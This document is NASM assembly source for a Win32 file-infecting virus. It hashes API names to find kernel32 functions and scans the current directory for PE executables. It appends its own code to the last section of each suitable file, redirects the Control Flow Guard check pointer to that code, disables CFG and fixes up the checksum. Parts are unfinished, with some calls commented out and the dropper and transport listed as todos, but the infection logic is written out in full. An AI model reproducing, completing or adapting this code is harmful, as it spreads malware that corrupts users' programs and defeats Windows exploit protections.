bits32

%include "twin.inc"


dllnames        db      "CloseHandle"       , 0
                db      "CreateFileA"       , 0
                db      "GlobalAlloc"       , 0
                db      "GlobalFree"        , 0
                db      "WriteFile"         , 0

krnnames        db      "CloseHandle"       , 0
                db      "CreateFileMappingW", 0
                db      "CreateFileW"       , 0
                db      "ExitProcess"       , 0
                db      "FindClose"         , 0
                db      "FindFirstFileW"    , 0
                db      "FindNextFileW"     , 0
                db      "MapViewOfFile"     , 0
                db      "SetEndOfFile"      , 0
                db      "SetFileAttributesW", 0
                db      "SetFilePointer"    , 0
                db      "SetFileTime"       , 0
                db      "UnmapViewOfFile"   , 0

global _main
section .text
_main:

;todo:
;delete push/pop ebx and jmp to dropper code, saving ebx not needed
        push    ebx
        mov     edx, dllcrcstk_size >> 2
        mov     ebx, dllnames
        mov     edi, dllcrcbegin
        call    create_crcs
        mov     edx, krncrcstk_size >> 2
        mov     ebx, krnnames
        mov     edi, krncrcbegin
        call    create_crcs
        pop     ebx
        jmp     twin_begin

create_crcs:
        or      eax, -1

create_outer:
        xor     al, byte [ebx]
        push    8
        pop     ecx

create_inner:
        shr     eax, 1
        jnc     create_skip
        xor     eax, 0edb88320h

create_skip:
        loop    create_inner
        inc     ebx
        cmp     byte [ebx], cl
        jne     create_outer
        not     eax
        stosd
        inc     ebx
        dec     edx
        jne     create_crcs
        ret

;-----------------------------------------------------------------------------
;everything before this point is dropper code
;-----------------------------------------------------------------------------

;-----------------------------------------------------------------------------
;main virus body.  everything happens in here
;-----------------------------------------------------------------------------

;todo: replace with [name]_inf and all refs
twin_begin:
        call    init_kernel32

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

krncrcbegin:
        times   (krncrcstk_size >> 2) dd 0
        db      0

;-----------------------------------------------------------------------------
;find files in current directory only
;-----------------------------------------------------------------------------

        enter   WIN32_FIND_DATA_size, 0
        push    "*"
        mov     edi, esp
        push    ecx
        push    edi
        push    edi
        call    dword [ebp + 4 + krncrcstk.kFindFirstFileW]
        xchg    eax, esi

test_dir:
        test    byte [edi + WIN32_FIND_DATA.dwFileAttributes], FILE_ATTRIBUTE_DIRECTORY
        jne     find_next
        push    esi
        push    FILE_ATTRIBUTE_ARCHIVE
        pop     edx
        ;call    set_fileattr
        ;call    open_file
        pop     esi

find_next:
        push    edi
        push    esi
        call    dword [ebp + 4 + krncrcstk.kFindNextFileW]
        dec     eax
        je      test_dir
        push    esi
        call    dword [ebp + 4 + krncrcstk.kFindClose]
                                             ;deep silent complete
        call    dword [ebp + 4 + krncrcstk.kExitProcess]

;-----------------------------------------------------------------------------
;reset/set read-only file attribute
;-----------------------------------------------------------------------------

open_file:                                   ;esi = file name, ebp -> platform APIs
        xor     ebx, ebx
        push    ebx
        push    ebx
        push    OPEN_EXISTING
        push    ebx
        push    ebx
        push    FILE_READ_DATA | FILE_WRITE_DATA
        push    esi
        call    dword [ebp + 4 + krncrcstk.kCreateFileW]
        lea     ecx, dword [edi + WIN32_FIND_DATA.ftLastWriteTime]
        lea     edx, dword [edi + WIN32_FIND_DATA.ftLastAccessTime]
        push    eax                          ;CloseHandle
        push    ecx                          ;SetFileTime
        push    edx                          ;SetFileTime
        push    ebx                          ;SetFileTime
        push    eax                          ;SetFileTime
        push    ebx
        push    ebx
        push    dword [edi + WIN32_FIND_DATA.dwFileSizeLow]
        push    esi
        call    dword [ebp + 4 + krncrcstk.kSetFilePointer]
        push    esi
        call    dword [ebp + 4 + krncrcstk.kSetEndOfFile]
        call    dword [ebp + 4 + krncrcstk.kSetFileTime]
        call    dword [ebp + 4 + krncrcstk.kCloseHandle]
        mov     edx, dword [edi + WIN32_FIND_DATA.dwFileAttributes]

;-----------------------------------------------------------------------------
;reset/set read-only file attribute
;-----------------------------------------------------------------------------

set_fileattr:                                ;edx = file attributes, edi -> find data, ebp -> platform APIs
        lea     esi, dword [edi + WIN32_FIND_DATA.cFileName]
        push    edx
        push    esi
        call    dword [ebp + 4 + krncrcstk.kSetFileAttributesW]
        ret                                  ;esi -> file name

;-----------------------------------------------------------------------------
;create file map, and map view if successful
;-----------------------------------------------------------------------------

map_view:                                    ;eax = file handle, edi -> find data, ebp -> platform APIs
        mov     edx, dword [edi + WIN32_FIND_DATA.dwFileSizeLow]
        add     edx, CODESIZE + 1
        push    ebx
        push    edx
        push    ebx
        push    PAGE_READWRITE
        push    ebx
        push    eax
        xchg    eax, esi
        call    dword [ebp + 4 + krncrcstk.kCreateFileMappingW]
        push    eax
        push    ebx
        push    ebx
        push    ebx
        push    FILE_MAP_WRITE
        push    eax
        call    dword [ebp + 4 + krncrcstk.kMapViewOfFile]
        push    eax
        pushad                               ;SEH destroys all registers
        call    infect_file
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        fs pop  dword [eax]
        pop     eax
        popad
        call    dword [ebp + 4 + krncrcstk.kUnmapViewOfFile]
        call    dword [ebp + 4 + krncrcstk.kCloseHandle]
        ret

init_kernel32:
        mov     eax, dword [ebx + pebLdr]    ;ebx = fs:[30h] at start time
        mov     esi, dword [eax + ldrInLoadOrderModuleList]
        lodsd
        xchg    esi, eax
        lodsd
        mov     ebp, dword [eax + mlDllBase]
        
;-----------------------------------------------------------------------------
;parse export table
;-----------------------------------------------------------------------------

parse_exports:
        pop     esi
        mov     ebx, ebp
        mov     eax, dword [ebp + mzhdr.mzlfanew]
        add     ebx, dword [ebp + eax + pehdr.peexport + pedir.dirrva]
        cdq

walk_names:
        mov     eax, ebp
        mov     edi, ebp
        inc     edx
        add     eax, dword [ebx + peexp.expnamerva]
        add     edi, dword [eax + edx * 4]
        or      eax, -1

crc_outer:
        xor     al, byte [edi]
        push    8
        pop     ecx

crc_inner:
        shr     eax, 1
        jnc     crc_skip
        xor     eax, 0edb88320h

crc_skip:
        loop    crc_inner
        inc     edi
        cmp     byte [edi], cl
        jne     crc_outer
        not     eax
        cmp     dword [esi], eax
        jne     walk_names

;-----------------------------------------------------------------------------
;exports must be sorted alphabetically, otherwise GetProcAddress() would fail
;this allows to push addresses onto the stack, and the order is known
;-----------------------------------------------------------------------------

        mov     edi, ebp
        mov     eax, ebp
        add     edi, dword [ebx + peexp.expordrva]
        movzx   edi, word [edi + edx * 2]
        add     eax, dword [ebx + peexp.expadrrva]
        mov     eax, dword [eax + edi * 4]
        add     eax, ebp
        push    eax
        lodsd
        sub     cl, byte [esi]
        jnz     walk_names
        inc     esi
        jmp     esi

;-----------------------------------------------------------------------------
;test if file is infectable (not protected, PE, Intel 386, non-system, not infected, etc)
;-----------------------------------------------------------------------------

test_file:
        cmp     word [esi], 'MZ'
        jne     test_ret
        mov     eax, dword [esi + mzhdr.mzlfanew]
        lea     eax, qword [esi + eax + pehdr.peheapsize]
        cmp     dword [eax + pehdr.pesig - pehdr.peheapsize], 'PE'
        jne     test_ret
        cmp     word [eax + pehdr.pecoff + coffhdr.pemachine - pehdr.peheapsize], IMAGE_FILE_MACHINE_I386
        jne     test_ret

;-----------------------------------------------------------------------------
;don't infect dll files
;-----------------------------------------------------------------------------

        movzx   ebp, word [eax + pehdr.pecoff + coffhdr.peopthdrsize - pehdr.peheapsize]
        cmp     bp, pehdr.pedelay - pehdr.pemagic
        jb      test_ret
        mov     ecx, dword [eax + pehdr.pecoff + coffhdr.peflags - pehdr.peheapsize]
        test    cl, IMAGE_FILE_EXECUTABLE_IMAGE
        je      test_ret
        ;test    ch, (IMAGE_FILE_DLL | IMAGE_FILE_SYSTEM) >> 12
        ;jne     test_ret

;-----------------------------------------------------------------------------
;ignore any other type except CUI/GUI
;-----------------------------------------------------------------------------

        cmp     word [eax + pehdr.pemagic - pehdr.peheapsize], IMAGE_NT_OPTIONAL_HDR32_MAGIC
        jne     test_ret
        mov     ecx, dword [eax + pehdr.pesubsys - pehdr.peheapsize]
        dec     ecx
        dec     ecx
        cmp     cx, IMAGE_SUBSYSTEM_WINDOWS_GUI - 1
        jnbe    test_ret

;-----------------------------------------------------------------------------
;avoid files which seem to contain attribute certificates
;because one of those certificates might be a digital signature
;-----------------------------------------------------------------------------

        cmp     dword [eax + pehdr.pesecurity - pehdr.peheapsize], 0
        jne     test_ret

;-----------------------------------------------------------------------------
;don't infect files with data outside the image (eg infected files, self-extractors, etc)
;-----------------------------------------------------------------------------

        push    esi
        lea     esi, dword [eax + ebp + pehdr.pemagic - pehdr.peheapsize]
        imul    bp, word [eax + pehdr.pecoff + coffhdr.pesectcount - pehdr.peheapsize], pesect_size
        lea     esi, dword [esi + ebp - pesect_size]
        mov     ebx, dword [esi + pesect.sectrawaddr]
        add     ebx, dword [esi + pesect.sectrawsize]
        add     edi, WIN32_FIND_DATA.dwFileSizeLow
        cmp     dword [edi], ebx
;        jne     test_ret                     ;file contains appended data

;-----------------------------------------------------------------------------
;don't infect files with virtual size larger than raw size: it may be a buffer
;of some kind and the code may get overwritten at some point
;remember: even if you have not seen it does not mean that it does not happen :)
;-----------------------------------------------------------------------------

        mov     ecx, dword [esi + pesect.sectvirtsize]
        cmp     dword [esi + pesect.sectrawsize], ecx
        jb      test_ret                     ;last section may have a buffer
        pop     ebx
        mov     ecx, dword [eax + pehdr.peconfig + pedir.dirrva - pehdr.peheapsize]
        jecxz   test_ret
        call    rva2raw
        cmp     dword [ecx], GuardFlags + 4
        jb      test_ret
        push    ecx
        mov     ecx, dword [ecx + GuardCFCheckFunctionPointer]
        jecxz   test_ret
        sub     ecx, dword [eax + pehdr.peimagebase - pehdr.peheapsize]
        call    rva2raw
        pop     ebx
        ret

test_ret:
        int3

;-----------------------------------------------------------------------------
;convert relative virtual address to raw file offset
;-----------------------------------------------------------------------------

rvaloop:
        sub     esi, pesect_size
        db      3ch                          ;mask PUSH ESI

rva2raw:                                     ;ecx = RVA, esi -> last section header
        push    esi
        cmp     dword [esi + pesect.sectvirtaddr], ecx
        jnbe    rvaloop
        sub     ecx, dword [esi + pesect.sectvirtaddr]
        add     ecx, dword [esi + pesect.sectrawaddr]
        add     ecx, ebx
        pop     esi
        ret

;-----------------------------------------------------------------------------
;infect file
;algorithm:     append last section and insert virus code there, image size is
;               increased. file size only increases by the size of the virus code
;               and a single byte for the infection marker
;               the code supports ASLR/DEP enabled files, SafeSEH and SEH disabled
;               CFG is not supported: an entry must be added to the Guard Table :)
;               CFG check function pointer is altered.  very simple
;-----------------------------------------------------------------------------

infect_file:
        fs push dword [ebx]
        fs mov  dword [ebx], esp
        xchg    eax, esi
        push    esi
        call    test_file
        pop     ebp
        push    edi
        push    ebx
        push    ecx
        push    ebp
        mov     ebp, dword [esi + pesect.sectrawsize]
        mov     ecx, CODESIZE
        add     dword [esi + pesect.sectrawsize], ecx
        stc
        adc     dword [edi], ecx             ;add code size plus 1 more byte
        add     dword [esi + pesect.sectvirtsize], ecx
        mov     edi, dword [esi + pesect.sectvirtsize]
        mov     ebx, dword [eax + pehdr.pesectalign - pehdr.peheapsize]
        dec     ebx
        add     edi, ebx
        not     ebx
        and     edi, ebx                     ;section align virtual size
        add     edi, dword [esi + pesect.sectvirtaddr]
        mov     dword [eax + pehdr.peimagesize - pehdr.peheapsize], edi

;-----------------------------------------------------------------------------
;section attributes are always altered to writable because we need to patch our entry point code
;the write bit could be set at runtime but we lost anti-heuristic already
;-----------------------------------------------------------------------------

        or      byte [esi + pesect.sectflags + 3], (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_WRITE) >> 18h

;-----------------------------------------------------------------------------
;copy code to last section
;-----------------------------------------------------------------------------

        pop     ebx
        mov     edi, dword [esi + pesect.sectrawaddr]
        add     edi, ebp
        add     edi, ebx
        add     ebp, dword [esi + pesect.sectvirtaddr]
        call    delta_inf

delta_inf:
        pop     esi
        sub     esi, delta_inf - twin_begin
        push    edi
        rep     movsb
        pop     edi

;-----------------------------------------------------------------------------
;replace function pointer
;-----------------------------------------------------------------------------

        pop     esi
        add     ebp, dword [eax + pehdr.peimagebase - pehdr.peheapsize]
        add     ebp, twin_execode - twin_begin
        mov     dword [esi], ebp

;-----------------------------------------------------------------------------
;erase CFG entries and disable it
;-----------------------------------------------------------------------------

        pop     edi
        add     edi, GuardCFCheckFunctionPointer
        xchg    eax, ecx

;todo: find a better way to do this without stosd

        stosd
        stosd
        stosd
        stosd
        stosd
        xchg    eax, ecx
        and     byte [eax + (pehdr.pedllflags + 1) - pehdr.peheapsize], (~IMAGE_DLLCHARACTERISTICS_GUARD_CF) >> 8

;-----------------------------------------------------------------------------
;CheckSumMappedFile() - simply sum of all words in file, then adc filesize
;-----------------------------------------------------------------------------

        xchg    dword [eax + pehdr.pechksum - pehdr.peheapsize], ecx
        jecxz   infect_ret
        pop     edi
        mov     ecx, dword [edi]
        mov     edi, ecx
        xor     esi, esi
        inc     ecx
        shr     ecx, 1
        clc

calc_checksum:
        adc     si, word [ebx]
        inc     ebx
        inc     ebx
        loop    calc_checksum
        adc     esi, edi
        mov     dword [eax + pehdr.pechksum - pehdr.peheapsize], esi
                                             ;avoid common bug.  ADC not ADD
infect_ret:
        int3                                 ;common exit using SEH

twin_execode:
        pushad
        xor     ebx, ebx
        fs mov  ebx, dword [ebx + 30h]
        call    init_kernel32

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

dllcrcbegin:
        times   dllcrcstk_size >> 2 dd 0
        db      0

;todo:
;write compressed PE headers, and decompression code (compression is manual)
;write technique implementation code, the transport code
;write dropper code

        popad
        ret
twin_end: